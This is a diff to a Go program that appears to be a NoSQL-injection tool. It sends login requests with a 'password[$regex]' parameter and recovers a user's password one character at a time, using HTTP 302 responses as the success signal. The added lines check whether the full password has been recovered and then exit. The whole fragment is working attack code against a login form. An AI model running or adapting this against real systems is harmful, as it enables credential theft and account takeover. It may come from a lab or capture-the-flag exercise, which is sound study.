@@ -1,10 +1,10 @@
-
 package main
 
 import (
 	"bytes"
 	"fmt"
 	"net/http"
+	"os"
 )
 
 var (
@@ -26,7 +26,14 @@ func fuzz() {
 			if code == 302 {
 				password += string(s)
 				fmt.Println(password)
-				break
+				reqbody := []byte("username=" + username + "&password[$regex]=^" + password + "$" + "&login=login")
+				code := makeRequest(reqbody)
+				if code == 302 {
+					fmt.Println("Enumeration Finished")
+					os.Exit(0)
+				} else {
+					break
+				}
 			}
 
 		}
